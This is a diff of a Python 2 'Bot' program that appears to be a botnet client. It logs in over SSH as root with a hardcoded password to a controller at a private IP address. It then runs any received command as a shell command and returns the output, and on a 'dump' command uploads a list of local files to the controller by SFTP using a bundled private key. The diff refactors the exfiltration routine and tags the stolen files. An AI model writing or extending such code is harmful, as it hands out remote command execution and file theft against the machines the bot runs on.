@@ -5,17 +5,19 @@ from paramiko import AutoAddPolicy
 from threading import  Thread
 from  subprocess import Popen
 from  subprocess import PIPE
-
-import  paramiko
+from paramiko import RSAKey
 import ChannelSSH
-import os
+import os.path
 import logging
 logging.basicConfig()
 duper_lp= "./path.cnf"
+ip_server='192.168.43.99'
 class Bot():
     def __init__(self):
         self.path_source = None
         self.path_destination = None
+        self.chan = None
+        self.tags = None
 
 
     def getOutputCmd(self,cmd):
@@ -28,31 +30,39 @@ class Bot():
         except:
             pass
 
-    def dump_db(self):
+    def sftp_authentication(self):
         try:
-            transport = Transport(('192.168.43.99', 222))
+            transport = Transport((ip_server, 222))
             privatekeyfile = os.path.expanduser('./bot_keys/id_rsa')
-            mykey = paramiko.RSAKey.from_private_key_file(privatekeyfile)
+            mykey = RSAKey.from_private_key_file(privatekeyfile)
             transport.connect(username='bot', pkey=mykey)
             sftp_client = SFTPClient.from_transport(transport)
+            return  sftp_client, transport
+        except Exception, e:
+            print "SFTP Authentication Fail:"+str(e)
+
+    def dump_db(self):
+        try:
+            fileserro=0
+            msgerror=""
+            sftp_client, transport = self.sftp_authentication()
             with open(duper_lp) as f:
                 content = f.readlines()
             # to remove whitespace characters like `\n` at the end of each line
             for line in content:
-                sftp_client.put(line.strip(), 'bot/dump/testdump.cnf')
+                line=line.strip()
+                if os.path.isfile(line):
+                    sftp_client.put(line,self.path_destination+self.tags+'_'+os.path.basename(line))
+                else:
+                    msgerror+="-- le fichier "+str(line)+" n'existe pas !! \n"
             sftp_client.close()
             transport.close()
-            print "End of dumping files "
+            ChannelSSH.sendToChannel("[*] End of dumping files "+"\n"+msgerror, self.chan)
         except Exception, e:
             print "Fct:Dumper file export: " + str(e)
     def get_dumper_file(self):
         try:
-            transport = Transport(('192.168.43.99', 222))
-            #mykey = paramiko.RSAKey(key=myprivatekey)
-            privatekeyfile = os.path.expanduser('./bot_keys/id_rsa')
-            mykey = paramiko.RSAKey.from_private_key_file(privatekeyfile)
-            transport.connect(username='bot',pkey = mykey)
-            sftp_client = SFTPClient.from_transport(transport)
+            sftp_client, transport = self.sftp_authentication()
             # should verify if file duper_lp exist, create it else
             sftp_client.get(self.path_source, duper_lp, callback=None)
             sftp_client.close()
@@ -65,25 +75,23 @@ class Bot():
         subRoot = None
         client = SSHClient()
         client.set_missing_host_key_policy(AutoAddPolicy())
-        client.connect('192.168.43.99',port=2222, username='root', password='thetoorpassword')
-        chan = client.get_transport().open_session()
+        client.connect(ip_server,port=2222, username='root', password='thetoorpassword')
+        self.chan = client.get_transport().open_session()
         while True:
-            command = ChannelSSH.receiveFromChannel(chan)
-            print  "cmd::"+command
+            command = ChannelSSH.receiveFromChannel(self.chan)
             if 'deconnect' == command:
-                ChannelSSH.closeChannel(chan)
+                ChannelSSH.closeChannel(self.chan)
                 break
             elif 'dump' == command:
-                ChannelSSH.sendToChannel('[+] Starting dump of files',chan)
                 Thread(target=self.dump_db).start()
             elif '**LOADPATH**' in command:
-                inita, path_d,path_s = command.split(';')
+                inita, path_d,tags,path_s = command.split(';')
                 self.path_source = path_s
                 self.path_destination = path_d
-                print ("ps:"+self.path_source+"--- path dest"+self.path_destination)
+                self.tags = tags
                 self.get_dumper_file()
             else:
-                ChannelSSH.sendToChannel(self.getOutputCmd(command),chan)
+                ChannelSSH.sendToChannel(self.getOutputCmd(command),self.chan)
 
 
 if __name__ == '__main__':
